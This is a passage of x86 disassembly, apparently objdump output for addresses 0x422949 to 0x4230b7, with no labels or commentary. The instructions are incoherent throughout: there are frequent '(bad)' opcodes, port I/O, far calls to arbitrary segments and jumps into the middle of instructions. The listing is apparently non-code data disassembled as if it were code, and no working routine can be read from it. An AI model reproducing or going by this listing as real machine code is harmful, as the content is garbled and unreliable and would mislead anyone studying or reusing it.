  422949:	inc    eax
  42294a:	cmp    esi,DWORD PTR [esi]
  42294c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42294d:	push   eax
  42294e:	and    dl,BYTE PTR [edi+0x25ec4b4d]
  422954:	pop    esi
  422955:	pushf  
  422956:	mov    bh,0x55
  422958:	clc    
  422959:	and    ah,BYTE PTR [eax+ebp*4-0x1a]
  42295d:	leave  
  42295e:	mov    WORD PTR [eax-0x37],es
  422961:	std    
  422962:	sub    eax,0x439ececb
  422967:	pop    esi
  422968:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42296a:	shr    BYTE PTR [eax],1
  42296c:	nop
  42296d:	xchg   esp,eax
  42296e:	imul   esp,DWORD PTR [ecx+0x24f94514],0x7f
  422975:	jae    0x42291c
  422977:	mov    eax,ds:0x390c67aa
  42297c:	mov    cl,0xf1
  42297e:	frstor [edi+0xaee4ef3]
  422984:	mov    dh,0x3c
  422986:	sbb    edx,DWORD PTR [edx-0x5f3cd5a7]
  42298c:	add    al,0x72
  42298e:	div    BYTE PTR [edx-0xd]
  422991:	mov    al,0xd9
  422993:	xchg   ebp,eax
  422994:	jo     0x4229ad
  422996:	push   eax
  422997:	push   0x93db4d5e
  42299c:	aam    0x57
  42299e:	add    eax,0x6d60753c
  4229a3:	mov    DWORD PTR [edx-0x2fc09ea2],ebp
  4229a9:	mov    ebp,esi
  4229ab:	jo     0x42295d
  4229ad:	mov    bl,0x4c
  4229af:	(bad)  
  4229b0:	mov    eax,ds:0x58a19435
  4229b5:	(bad)  
  4229b6:	out    0xda,al
  4229b8:	out    dx,al
  4229b9:	popa   
  4229ba:	cli    
  4229bb:	fistp  WORD PTR [esi+0x46]
  4229be:	mov    ecx,0xbdf4144c
  4229c3:	dec    DWORD PTR [edi-0x5877adbd]
  4229c9:	loopne 0x422a17
  4229cb:	jno    0x4229ff
  4229cd:	push   ds
  4229ce:	jg     0x42298d
  4229d0:	pop    esi
  4229d1:	in     eax,0x58
  4229d3:	inc    esi
  4229d4:	push   ds
  4229d5:	stc    
  4229d6:	xchg   edi,edx
  4229d8:	(bad)  
  4229d9:	pusha  
  4229da:	nop
  4229db:	inc    edi
  4229dc:	xchg   esp,eax
  4229dd:	sbb    al,0x60
  4229df:	enter  0x4e07,0xee
  4229e3:	inc    esp
  4229e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229e5:	push   ss
  4229e6:	inc    edi
  4229e7:	jge    0x422a45
  4229e9:	add    al,0xbe
  4229eb:	stos   BYTE PTR es:[edi],al
  4229ec:	in     eax,0x56
  4229ee:	outs   dx,BYTE PTR ds:[esi]
  4229ef:	(bad)  
  4229f0:	lock xacquire xchg BYTE PTR [eax+0xd70a51],ch
  4229f8:	pop    esi
  4229f9:	push   0x39ef5940
  4229fe:	xlat   BYTE PTR ds:[ebx]
  4229ff:	into   
  422a00:	je     0x4229a4
  422a02:	jmp    0x4229a4
  422a04:	out    0x69,al
  422a06:	dec    eax
  422a07:	xchg   ebx,eax
  422a08:	dec    ebp
  422a09:	mov    bh,BYTE PTR [eax-0x5a]
  422a0c:	pop    esi
  422a0d:	or     al,0x93
  422a0f:	cs and dl,bh
  422a12:	mov    ah,BYTE PTR ds:[ebx]
  422a15:	popa   
  422a16:	cmp    ch,BYTE PTR [edx]
  422a18:	xchg   ecx,eax
  422a19:	repnz pop esi
  422a1b:	int    0x2f
  422a1d:	pushf  
  422a1e:	out    dx,al
  422a1f:	ins    BYTE PTR es:[edi],dx
  422a20:	mov    esp,0x3a1b305f
  422a25:	(bad)  
  422a26:	(bad)  
  422a28:	inc    DWORD PTR [edx+0x45]
  422a2b:	mov    bl,0x6b
  422a2d:	loopne 0x4229c8
  422a2f:	pop    ds
  422a30:	sub    esi,DWORD PTR [edx+0x6c5ea1bf]
  422a36:	mov    ch,0xe
  422a38:	ins    BYTE PTR es:[edi],dx
  422a39:	es mov bh,bh
  422a3c:	add    bh,BYTE PTR [ecx-0x2eed6648]
  422a42:	out    0x16,eax
  422a44:	fmulp  st(4),st
  422a46:	dec    eax
  422a47:	shl    BYTE PTR [eax],0x84
  422a4a:	add    ecx,esp
  422a4c:	hlt    
  422a4d:	test   DWORD PTR [ecx],esp
  422a4f:	and    DWORD PTR [ecx+0x1d],edi
  422a52:	push   ebp
  422a53:	stc    
  422a54:	adc    eax,0xa7a2b813
  422a59:	push   0x65
  422a5b:	ins    DWORD PTR es:[edi],dx
  422a5c:	punpcklbw mm1,DWORD PTR [esi-0x3e]
  422a60:	adc    esp,DWORD PTR ds:0x7a50c5e1
  422a66:	adc    edi,esp
  422a68:	pop    esi
  422a69:	(bad)  
  422a6a:	(bad)  
  422a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a6c:	imul   ecx,DWORD PTR [eax],0xffffff92
  422a6f:	mov    eax,ds:0x2a429ee
  422a74:	pop    edx
  422a75:	sbb    al,0x72
  422a77:	sub    al,0x5e
  422a79:	fidivr DWORD PTR [eax+0x744c4c41]
  422a7f:	shl    BYTE PTR [ecx+0x60],1
  422a82:	loope  0x422aa5
  422a84:	fcomip st,st(1)
  422a86:	mov    bl,BYTE PTR [esi-0x581196af]
  422a8c:	retf   
  422a8d:	xchg   DWORD PTR [ecx],ebx
  422a8f:	std    
  422a90:	or     cl,dh
  422a92:	dec    ecx
  422a93:	mov    eax,ds:0x19a60016
  422a98:	cmp    ah,BYTE PTR [ebx-0x19a11774]
  422a9e:	push   ebp
  422aa0:	loop   0x422a27
  422aa2:	mov    bh,0xc
  422aa4:	mov    edx,0x8968f760
  422aa9:	mov    ah,0xea
  422aab:	fisub  DWORD PTR [esi+edi*8-0x12]
  422aaf:	adc    BYTE PTR [ebp+0x4d62df30],bl
  422ab5:	inc    edi
  422ab6:	stos   BYTE PTR es:[edi],al
  422ab7:	mov    eax,ds:0xfef83c93
  422abc:	lahf   
  422abd:	lods   eax,DWORD PTR ds:[esi]
  422abe:	repz loopne 0x422a70
  422ac1:	or     BYTE PTR fs:[ecx-0x7f060da2],0x79
  422ac9:	add    ah,BYTE PTR [edi-0x5faa7ec3]
  422acf:	jl     0x422b3f
  422ad1:	retf   
  422ad2:	out    dx,al
  422ad3:	xchg   edi,eax
  422ad4:	and    DWORD PTR [ebx-0x3d],ebp
  422ad7:	in     al,dx
  422ad8:	pop    esi
  422ad9:	stos   BYTE PTR es:[edi],al
  422ada:	test   bh,bh
  422adc:	aaa    
  422add:	rcl    DWORD PTR [ecx+0x1f608111],0xa6
  422ae4:	pushf  
  422ae5:	add    eax,DWORD PTR [edx-0x11abe174]
  422aeb:	lock fimul DWORD PTR [eax]
  422aee:	mov    edi,0x4763582b
  422af3:	mov    ebp,0xa17dfe24
  422af8:	inc    edx
  422af9:	ficomp DWORD PTR [ecx+ebp*2-0x6a]
  422afd:	cmp    ebp,esi
  422aff:	push   esp
  422b00:	lea    edi,[ebp-0x67]
  422b03:	cmp    al,0xab
  422b05:	push   ds
  422b06:	add    eax,0x7aa484a1
  422b0b:	pop    ecx
  422b0c:	or     dh,ch
  422b0e:	jb     0x422adc
  422b10:	xor    al,0x49
  422b12:	shl    BYTE PTR [eax+0xb21b61],cl
  422b18:	mov    esp,0x9fa8853a
  422b1d:	je     0x422b0f
  422b1f:	xlat   BYTE PTR ds:[ebx]
  422b20:	js     0x422b32
  422b22:	jle    0x422aaa
  422b24:	push   cs
  422b25:	nop
  422b26:	in     eax,dx
  422b27:	call   0x753:0xd2c262c3
  422b2e:	inc    edi
  422b2f:	jno    0x422ad7
  422b31:	cmc    
  422b32:	stc    
  422b33:	mov    al,ds:0x4f5143de
  422b38:	pop    es
  422b39:	jmp    0x422bb0
  422b3b:	jno    0x422b6f
  422b3d:	fldcw  WORD PTR [ecx+eiz*1]
  422b40:	mov    esi,0xee4ab55d
  422b45:	ins    BYTE PTR es:[edi],dx
  422b46:	sbb    DWORD PTR [ecx-0x266a8020],esp
  422b4c:	into   
  422b4d:	gs scas eax,DWORD PTR es:[edi]
  422b4f:	mov    ds,WORD PTR [esi-0x14]
  422b52:	push   0xffffff9b
  422b54:	jge    0x422b8d
  422b56:	mov    ebp,DWORD PTR [edi+0x4]
  422b59:	popa   
  422b5a:	mov    ah,0xd7
  422b5c:	dec    esi
  422b5d:	mov    esi,0x1bc4f11c
  422b62:	out    dx,al
  422b63:	push   esp
  422b64:	in     eax,0xde
  422b66:	inc    esp
  422b67:	mov    edi,DWORD PTR [edx]
  422b69:	adc    dh,BYTE PTR [edx-0x7b382d60]
  422b6f:	cmp    al,0xe
  422b71:	aad    0x9b
  422b73:	sub    bl,BYTE PTR [esi-0x5b]
  422b76:	lahf   
  422b77:	aad    0x31
  422b79:	mov    ebx,fs
  422b7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b7c:	popf   
  422b7d:	pusha  
  422b7e:	jo     0x422bca
  422b80:	dec    eax
  422b81:	xchg   ebp,eax
  422b82:	adc    cl,0xc3
  422b85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b86:	push   esp
  422b87:	jae    0x422be7
  422b89:	inc    edx
  422b8a:	aaa    
  422b8b:	(bad)  
  422b8c:	aas    
  422b8d:	or     eax,0xe96605e2
  422b92:	lods   eax,DWORD PTR ds:[esi]
  422b93:	mov    al,ds:0x81d1f31
  422b98:	pushf  
  422b99:	loop   0x422be3
  422b9b:	rcr    DWORD PTR [esi+0x4d],0x75
  422b9f:	and    eax,0x608f7730
  422ba4:	inc    edi
  422ba5:	pop    edi
  422ba6:	lock loopne 0x422c09
  422ba9:	sbb    dl,ch
  422bab:	inc    BYTE PTR ds:0xce60cda8
  422bb2:	stos   DWORD PTR es:[edi],eax
  422bb3:	push   ss
  422bb4:	punpckldq mm3,DWORD PTR [esp+eax*1+0x8]
  422bb9:	jmp    0x24442afe
  422bbe:	pop    eax
  422bbf:	mov    eax,ds:0x6a94ba32
  422bc4:	retf   0xb545
  422bc7:	push   ss
  422bc8:	pop    esi
  422bc9:	xchg   ecx,eax
  422bca:	cmp    eax,0xd76d12a8
  422bcf:	jp     0x422c39
  422bd1:	popa   
  422bd2:	out    0xa2,al
  422bd4:	aam    0xb8
  422bd6:	loopne 0x422c4f
  422bd8:	shl    BYTE PTR [ecx-0x3e],cl
  422bdb:	jnp    0x422ba7
  422bdd:	pusha  
  422bde:	lock push ss
  422be0:	shr    BYTE PTR [esi-0x47],0x23
  422be4:	cmc    
  422be5:	pusha  
  422be6:	or     ecx,DWORD PTR [ebp+0x18d29d5d]
  422bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bed:	mov    al,ds:0xab19dbee
  422bf2:	xchg   ecx,eax
  422bf3:	daa    
  422bf4:	outs   dx,DWORD PTR ds:[esi]
  422bf5:	or     esp,DWORD PTR [eax-0x58]
  422bf8:	and    al,0x6
  422bfa:	lock test al,0x1f
  422bfd:	and    DWORD PTR [edx-0x45],edx
  422c00:	dec    esp
  422c01:	gs out dx,al
  422c03:	pop    ss
  422c04:	sbb    cl,ah
  422c06:	ins    BYTE PTR es:[edi],dx
  422c07:	push   es
  422c08:	ficom  WORD PTR [ecx]
  422c0a:	xchg   esp,eax
  422c0b:	test   al,0xc1
  422c0d:	cld    
  422c0e:	mov    ch,cl
  422c10:	lds    ecx,FWORD PTR [esi+0x60]
  422c13:	pop    ebx
  422c14:	push   ds
  422c15:	jbe    0x422c80
  422c17:	outs   dx,BYTE PTR ds:[esi]
  422c18:	pop    esi
  422c19:	xlat   BYTE PTR ds:[ebx]
  422c1a:	arpl   WORD PTR [eax-0x179aa026],si
  422c20:	aam    0x60
  422c22:	push   0xaf2a2a7
  422c27:	xor    bl,BYTE PTR gs:[ebx-0x1060a817]
  422c2e:	jno    0x422c7d
  422c30:	mov    esi,0x2e711809
  422c35:	popa   
  422c36:	xor    BYTE PTR [eax-0x8657d0d],cl
  422c3c:	cli    
  422c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c3e:	out    dx,al
  422c3f:	push   ds
  422c40:	jns    0x422c07
  422c42:	cmp    eax,0x1836454d
  422c47:	mov    al,ds:0xec6d2b83
  422c4c:	mov    esi,0xc13cb561
  422c51:	sub    dh,0x1e
  422c54:	push   eax
  422c55:	pusha  
  422c56:	add    esi,DWORD PTR [eax-0x78]
  422c59:	out    dx,al
  422c5a:	and    BYTE PTR [ecx-0xd25bffd],ah
  422c60:	not    esi
  422c62:	or     cl,bh
  422c64:	pop    esi
  422c65:	neg    BYTE PTR [ebx+0x29]
  422c68:	ror    BYTE PTR [edi],0xd4
  422c6b:	mov    dh,0xd9
  422c6d:	pusha  
  422c6e:	xor    BYTE PTR [ebx-0x254ad94f],0x66
  422c75:	rcr    BYTE PTR [esi+0x2b],0x5e
  422c79:	xchg   edi,eax
  422c7a:	test   DWORD PTR [esi-0x3],esi
  422c7d:	(bad)  
  422c7e:	and    esi,DWORD PTR [edx+0x1a]
  422c81:	pusha  
  422c82:	aad    0xc9
  422c84:	icebp  
  422c85:	jae    0x422c8d
  422c87:	cmp    eax,0x8161b2e2
  422c8c:	mov    ebx,0x99a0ef91
  422c91:	jge    0x422c92
  422c93:	xor    bh,0x55
  422c96:	cmp    DWORD PTR [edi+0x7c],edi
  422c99:	dec    ecx
  422c9a:	out    dx,al
  422c9b:	ret    0x9cff
  422c9e:	inc    esi
  422c9f:	mov    ecx,0xa18a5907
  422ca4:	fld    QWORD PTR [ebx+0x162bdcd9]
  422caa:	xchg   esp,eax
  422cab:	inc    eax
  422cac:	pop    esi
  422cad:	mov    es,WORD PTR [esi*2+0x35ecce69]
  422cb4:	(bad)  
  422cb5:	pusha  
  422cb6:	scas   al,BYTE PTR es:[edi]
  422cb7:	add    al,0xf3
  422cb9:	and    dl,bl
  422cbb:	adc    al,0x3b
  422cbd:	cld    
  422cbe:	(bad)  
  422cbf:	(bad)  [esi]
  422cc1:	lea    edi,[esi+0x364da8a0]
  422cc7:	xchg   edx,eax
  422cc8:	das    
  422cc9:	ret    0x8da7
  422ccc:	(bad)  
  422ccd:	cld    
  422cce:	adc    DWORD PTR [ecx-0x73406d51],esp
  422cd4:	aad    0xa6
  422cd6:	jmp    0x422cf3
  422cd8:	mov    cl,BYTE PTR [edx-0x1ee8826f]
  422cde:	or     DWORD PTR [ebp-0x9],0x2f
  422ce2:	inc    esi
  422ce3:	lock pop ebx
  422ce5:	push   ebx
  422ce6:	dec    eax
  422ce7:	call   0x40a3:0xc5c7dc86
  422cee:	mov    dh,0x4b
  422cf0:	push   ds
  422cf1:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cf3:	in     al,0x5e
  422cf5:	fsubr  QWORD PTR [edi-0x3c]
  422cf8:	scas   al,BYTE PTR es:[edi]
  422cf9:	outs   dx,DWORD PTR ds:[esi]
  422cfa:	and    dl,BYTE PTR [edx+eiz*2]
  422cfd:	popa   
  422cfe:	cmp    BYTE PTR [edx],bh
  422d00:	addr16 mov ebx,0x1d90ba16
  422d06:	cmc    
  422d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d08:	lods   al,BYTE PTR ds:[esi]
  422d09:	mov    ah,0x50
  422d0b:	lahf   
  422d0c:	adc    ah,BYTE PTR [ecx-0x2c]
  422d0f:	outs   dx,BYTE PTR ds:[esi]
  422d10:	arpl   WORD PTR [edx],bx
  422d12:	out    0xa0,al
  422d14:	inc    eax
  422d15:	repnz sbb DWORD PTR [ebp+0x1],ebp
  422d19:	pop    ebx
  422d1a:	aas    
  422d1b:	gs pop esi
  422d1d:	push   es
  422d1e:	sub    eax,0x81ba3a72
  422d23:	xchg   ecx,eax
  422d24:	cwde   
  422d25:	pusha  
  422d26:	ficomp DWORD PTR [ebx-0x19]
  422d29:	xor    al,0x85
  422d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d2c:	jne    0x422cb0
  422d2e:	out    dx,al
  422d2f:	xchg   edi,eax
  422d30:	cld    
  422d31:	inc    esi
  422d32:	mov    gs,WORD PTR [edi]
  422d34:	imul   BYTE PTR [ecx+edi*2-0x5f]
  422d38:	mov    al,0x5d
  422d3a:	push   esp
  422d3b:	mov    edx,0xf5e7ef7c
  422d40:	pop    esi
  422d41:	and    DWORD PTR [bx+si+0x34],edi
  422d45:	pop    DWORD PTR [edx]
  422d47:	loope  0x422d97
  422d49:	fs stos BYTE PTR es:[edi],al
  422d4b:	add    bl,ah
  422d4d:	neg    DWORD PTR [ebx+0x1e]
  422d50:	jle    0x422d12
  422d52:	out    0x2c,al
  422d54:	in     al,dx
  422d55:	jae    0x422d45
  422d57:	(bad)  
  422d58:	and    BYTE PTR [esi],dh
  422d5a:	dec    ecx
  422d5b:	cmp    DWORD PTR [eax+0x9],0xffffffb4
  422d5f:	mov    ds:0x421605ae,eax
  422d64:	push   0x22102ef0
  422d69:	fwait
  422d6a:	and    eax,0x535310c0
  422d6f:	ret    0x206c
  422d72:	iret   
  422d73:	xchg   DWORD PTR [eax-0x7f],esp
  422d76:	repnz mov al,ds:0xe4e47de7
  422d7c:	and    ch,dl
  422d7e:	mov    esp,0xcdd23860
  422d83:	mov    al,ds:0xb77512f1
  422d88:	popf   
  422d89:	xchg   BYTE PTR [ebp+0x1a0d0ca0],ch
  422d8f:	imul   ecx,DWORD PTR [ebx+edx*1+0x575e58be],0xfffffff8
  422d97:	aas    
  422d98:	pop    ebp
  422d99:	scas   eax,DWORD PTR es:[edi]
  422d9a:	xchg   ecx,eax
  422d9b:	and    DWORD PTR [edi],ecx
  422d9d:	popa   
  422d9e:	lods   eax,DWORD PTR ds:[esi]
  422d9f:	jp     0x422d96
  422da1:	dec    esp
  422da2:	retf   0xba4c
  422da5:	ret    0xc6ee
  422da8:	pushf  
  422da9:	sti    
  422daa:	sbb    ecx,0xa0b58dff
  422db0:	div    BYTE PTR [esi-0x27620f0d]
  422db6:	sbb    eax,0x26635d29
  422dbb:	sbb    al,0xe5
  422dbd:	les    eax,FWORD PTR [ecx+0x35]
  422dc0:	sahf   
  422dc1:	push   edi
  422dc2:	retf   0xfa0
  422dc5:	ret    0x54fc
  422dc8:	fistp  WORD PTR [ecx-0x1a156fe]
  422dce:	xor    BYTE PTR [ecx+edi*8+0x3eeb6635],0x53
  422dd6:	xchg   esi,eax
  422dd7:	pop    eax
  422dd8:	stos   DWORD PTR es:[edi],eax
  422dd9:	jb     0x422dc9
  422ddb:	mov    eax,ds:0x6cc20637
  422de0:	pop    esi
  422de1:	add    ch,ah
  422de3:	cdq    
  422de4:	scas   al,BYTE PTR es:[edi]
  422de5:	mov    ebx,0x60dbfdb9
  422dea:	cmp    bl,bl
  422dec:	inc    eax
  422ded:	push   edx
  422dee:	dec    edi
  422def:	mov    dl,BYTE PTR [edx-0x17]
  422df2:	out    dx,al
  422df3:	imul   esp,DWORD PTR [esi],0x808acbc8
  422df9:	movntq QWORD PTR [eax-0x68abe663],mm4
  422e00:	stos   DWORD PTR es:[edi],eax
  422e01:	mov    ah,0x34
  422e03:	sbb    al,0x5e
  422e05:	(bad)  
  422e06:	mov    edx,0x3230eac0
  422e0b:	out    dx,al
  422e0c:	clc    
  422e0d:	pusha  
  422e0e:	loop   0x422da1
  422e10:	pop    edi
  422e11:	cwde   
  422e12:	retf   
  422e13:	pop    es
  422e14:	sbb    BYTE PTR [ebx-0x12],dl
  422e17:	jmp    0x4f4c3a6
  422e1c:	out    0xfa,al
  422e1e:	ins    BYTE PTR es:[edi],dx
  422e1f:	mov    eax,ds:0x708a6de5
  422e24:	fwait
  422e25:	add    ebx,DWORD PTR [ecx-0x11d68f60]
  422e2b:	dec    ecx
  422e2c:	or     eax,0x83afe5d3
  422e31:	bound  edi,QWORD PTR ds:0xafe03a1
  422e37:	add    eax,0x1aafcb3
  422e3c:	repnz cmp eax,0x1fc1ff2e
  422e42:	dec    esp
  422e43:	xchg   edx,eax
  422e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e45:	pusha  
  422e46:	rcr    dh,0x19
  422e49:	ja     0x422dec
  422e4b:	push   ecx
  422e4c:	or     dh,BYTE PTR [ecx]
  422e4e:	out    dx,al
  422e4f:	mov    ecx,0x3b06c839
  422e54:	sbb    al,0x3d
  422e56:	(bad)  
  422e57:	or     dh,al
  422e59:	pop    ebp
  422e5a:	push   eax
  422e5b:	or     DWORD PTR [ebx+ebx*8-0x21],ebp
  422e5f:	pop    eax
  422e60:	(bad)  
  422e61:	xor    BYTE PTR [esp+edx*2+0x5b],cl
  422e65:	pop    eax
  422e66:	leave  
  422e67:	xchg   esp,eax
  422e68:	push   ss
  422e69:	dec    ecx
  422e6a:	or     eax,0x1e5adead
  422e6f:	imul   esp,DWORD PTR [bx+si+0x77],0x35
  422e74:	xchg   BYTE PTR [eax+eax*2-0x3e],bh
  422e78:	push   edx
  422e79:	sbb    ch,dh
  422e7b:	data16 fst QWORD PTR [edx+0x45]
  422e7f:	pop    ebp
  422e80:	sub    DWORD PTR [edi],ecx
  422e82:	jp     0x422e25
  422e84:	popa   
  422e85:	push   ecx
  422e86:	aaa    
  422e87:	(bad)  
  422e88:	pop    edi
  422e89:	jl     0x422e31
  422e8b:	xor    BYTE PTR [esi-0x31],bl
  422e8e:	out    dx,eax
  422e8f:	add    ecx,DWORD PTR [ecx+0x68b787c7]
  422e95:	popa   
  422e96:	cmp    al,BYTE PTR [edi-0x526d21a7]
  422e9c:	xor    al,0xb7
  422e9e:	out    dx,al
  422e9f:	dec    ecx
  422ea0:	xor    DWORD PTR [ebx],ecx
  422ea2:	fdiv   st(6),st
  422ea4:	fidiv  DWORD PTR [esi+0x3c]
  422ea7:	mov    eax,ds:0x9d28c856
  422eac:	mov    bl,0xa9
  422eae:	dec    edx
  422eaf:	or     eax,0xf26f5154
  422eb4:	jno    0x422f16
  422eb6:	lds    esi,FWORD PTR [ebp+ecx*2+0x2b]
  422eba:	dec    esi
  422ebb:	jl     0x422ec8
  422ebd:	push   edx
  422ebe:	mov    eax,ds:0x2e0dc1aa
  422ec3:	push   ebx
  422ec4:	mov    edx,0x5fe416fb
  422ec9:	lea    edi,[ecx-0x7089cde1]
  422ecf:	and    BYTE PTR [esi+0x7c],ch
  422ed2:	js     0x422e95
  422ed4:	add    BYTE PTR [ecx+0x41],ah
  422ed7:	out    dx,eax
  422ed8:	cmp    eax,0x524cc225
  422edd:	inc    esp
  422ede:	out    0x28,eax
  422ee0:	clc    
  422ee1:	je     0x422e77
  422ee3:	inc    ebp
  422ee4:	pop    ebx
  422ee5:	inc    ebx
  422ee6:	push   ds
  422ee7:	mov    DWORD PTR [esi-0x13],esi
  422eea:	jbe    0x422e8d
  422eec:	mov    ebx,esp
  422eee:	cmp    bh,BYTE PTR [ecx]
  422ef0:	je     0x422ebf
  422ef2:	in     eax,dx
  422ef3:	fsub   DWORD PTR [eax-0x28]
  422ef6:	bound  ebp,QWORD PTR [ebx]
  422ef8:	out    dx,al
  422ef9:	mul    BYTE PTR ds:0x5a3ef702
  422eff:	inc    eax
  422f00:	jae    0x422f5f
  422f02:	les    esp,FWORD PTR [edx-0x53161537]
  422f08:	ins    DWORD PTR es:[edi],dx
  422f09:	scas   al,BYTE PTR es:[edi]
  422f0a:	out    dx,eax
  422f0b:	pop    eax
  422f0c:	cmp    BYTE PTR [esi-0x439d9f12],bl
  422f12:	or     ch,BYTE PTR [edx-0x2b]
  422f15:	bound  esi,QWORD PTR [eax-0x5f]
  422f18:	sar    DWORD PTR [edi],cl
  422f1a:	mov    eax,ds:0x9e2653dc
  422f1f:	xchg   esi,eax
  422f20:	pop    esi
  422f21:	pop    ecx
  422f22:	lds    eax,FWORD PTR [eax-0x5da40670]
  422f28:	mov    eax,0x923e6a60
  422f2d:	imul   eax,DWORD PTR [ebp-0x11f13860],0x1e
  422f34:	pop    eax
  422f35:	ret    0x490
  422f38:	js     0x422f31
  422f3a:	outs   dx,DWORD PTR ds:[esi]
  422f3b:	icebp  
  422f3c:	fisub  DWORD PTR [eax-0x76]
  422f3f:	scas   eax,DWORD PTR es:[edi]
  422f40:	jmp    0x144a38a9
  422f45:	mov    bl,0xed
  422f47:	ja     0x422f3a
  422f49:	cmp    ebx,DWORD PTR [ebx]
  422f4b:	pop    edi
  422f4c:	lods   al,BYTE PTR ds:[esi]
  422f4d:	inc    ebx
  422f4e:	xor    al,BYTE PTR [ebx-0x5d]
  422f51:	pusha  
  422f52:	ds xor al,0x7b
  422f55:	inc    edx
  422f56:	inc    ebp
  422f57:	push   ebp
  422f58:	mov    al,0x6a
  422f5a:	out    dx,al
  422f5b:	cld    
  422f5c:	jno    0x422fd7
  422f5e:	jl     0x422fcb
  422f60:	adc    edi,DWORD PTR [esi+0x3058a0e7]
  422f66:	adc    al,0xbf
  422f68:	mov    bh,0x4
  422f6a:	mov    DWORD PTR [esi+ebx*2+0x59],eax
  422f6e:	clc    
  422f6f:	and    bh,BYTE PTR [esi-0x4ae589e1]
  422f75:	pusha  
  422f76:	cmp    bh,BYTE PTR [ecx-0x24]
  422f79:	xchg   ebx,eax
  422f7a:	bound  ebp,QWORD PTR [esi+0x7]
  422f7d:	loop   0x422f3d
  422f7f:	retf   
  422f80:	jo     0x422fbf
  422f82:	in     eax,dx
  422f83:	stc    
  422f84:	fsubr  DWORD PTR [esi+eax*4]
  422f87:	pop    edx
  422f88:	mov    edi,ecx
  422f8a:	sub    ah,al
  422f8c:	es popa 
  422f8e:	data16 js 0x422f4b
  422f91:	mov    esp,DWORD PTR [edx+eax*2]
  422f94:	pop    es
  422f95:	shr    dh,cl
  422f97:	dec    esp
  422f98:	jg     0x422fa9
  422f9a:	adc    al,0x2d
  422f9c:	rcr    esi,0x2c
  422f9f:	mov    eax,ds:0x7a40bdf
  422fa4:	(bad)  
  422fa5:	imul   ebp,edi,0x5f
  422fa8:	pop    esi
  422fa9:	test   al,0x2b
  422fab:	lds    edx,FWORD PTR [ecx-0x55ae3e04]
  422fb1:	enter  0xa0e4,0x14
  422fb5:	out    0x20,al
  422fb7:	push   esp
  422fb8:	lock dec ecx
  422fba:	mov    WORD PTR [edx+0x60],?
  422fbd:	ds jmp 0xed9f5ee5
  422fc3:	pusha  
  422fc4:	mul    DWORD PTR [ecx]
  422fc6:	es stos BYTE PTR es:[edi],al
  422fc8:	inc    esi
  422fc9:	xor    ch,dh
  422fcb:	ds aaa 
  422fcd:	pop    es
  422fce:	push   edx
  422fcf:	fs mov esp,0x6530866c
  422fd5:	sub    DWORD PTR [edx],edi
  422fd7:	xchg   ebx,eax
  422fd8:	mov    edi,0x3c22185d
  422fdd:	sbb    BYTE PTR [esi+0x4c],0x45
  422fe1:	fwait
  422fe2:	iret   
  422fe3:	mov    ss,WORD PTR [esi+0x40]
  422fe6:	loop   0x422f88
  422fe8:	sub    al,0xf4
  422fea:	sbb    ebx,DWORD PTR [ebx+ebx*8+0x4334eeb1]
  422ff1:	sub    DWORD PTR [ecx+0xc],edx
  422ff4:	xchg   bl,bh
  422ff6:	add    ah,BYTE PTR [ecx+0x26642b14]
  422ffc:	je     0x42302f
  422ffe:	pop    edi
  422fff:	cmp    al,0x4a
  423002:	out    dx,al
  423003:	push   ebp
  423004:	xchg   esi,eax
  423005:	jo     0x423058
  423007:	push   ecx
  423008:	aad    0x11
  42300a:	mov    ah,0xa0
  42300c:	ret    0x1c91
  42300f:	mov    dl,0xf0
  423011:	jmp    0x1174:0xcc4f2aa8
  423018:	pop    esi
  423019:	and    BYTE PTR [edi],0xcf
  42301c:	fcom   DWORD PTR [ecx]
  42301e:	int3   
  42301f:	mov    al,ds:0x42b5246c
  423024:	les    edi,FWORD PTR [edx+0x4a5ea4e1]
  42302a:	popf   
  42302b:	dec    edi
  42302c:	jge    0x423000
  42302e:	div    BYTE PTR [eax+0x160860b5]
  423034:	imul   esp,DWORD PTR [ecx+0x41f752c9],0xffffffee
  42303b:	sti    
  42303c:	cld    
  42303d:	mov    esi,0xa3a6f39a
  423042:	sub    DWORD PTR [ecx+0x32845c9b],esp
  423048:	jns    0x422fdc
  42304a:	aad    0x88
  42304c:	pop    esi
  42304d:	rcr    DWORD PTR [bx],1
  423050:	call   0x7c61:0x4c0e2cb9
  423057:	aam    0x51
  423059:	mov    ds:0x7ec595f4,al
  42305e:	out    dx,al
  42305f:	cmp    BYTE PTR [ebp-0x3ef5bbd9],bl
  423065:	out    0xf5,al
  423067:	lahf   
  423068:	fcmovnbe st,st(3)
  42306a:	jecxz  0x423002
  42306c:	jle    0x423027
  42306e:	gs pop ebp
  423070:	xchg   DWORD PTR [ecx],esp
  423072:	out    0x23,eax
  423074:	outs   dx,BYTE PTR ds:[esi]
  423075:	pop    ss
  423076:	inc    ebp
  423077:	ror    BYTE PTR [esi-0x1aba3b98],1
  42307d:	inc    edx
  42307e:	dec    ecx
  42307f:	inc    edx
  423080:	cmp    ebx,edx
  423082:	aaa    
  423083:	push   eax
  423084:	sub    eax,0x4ae25b71
  423089:	leave  
  42308a:	sti    
  42308b:	mov    eax,0x6febd039
  423090:	and    eax,0xa7411b44
  423095:	lods   al,BYTE PTR ds:[esi]
  423096:	sti    
  423097:	mov    ds:0x72cf5299,eax
  42309c:	fmul   QWORD PTR [eax]
  42309e:	ss loope 0x423093
  4230a1:	(bad)  
  4230a2:	out    dx,al
  4230a3:	imul   ebx,ecx,0x7c
  4230a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230a7:	and    BYTE PTR [eax+edi*1+0x2daea0af],0xd9
  4230af:	sahf   
  4230b0:	ins    DWORD PTR es:[edi],dx
  4230b1:	or     ebp,DWORD PTR [ebp+0x73]
  4230b4:	scas   al,BYTE PTR es:[edi]
  4230b5:	mov    esi,gs
  4230b7:	ds int 0x3b
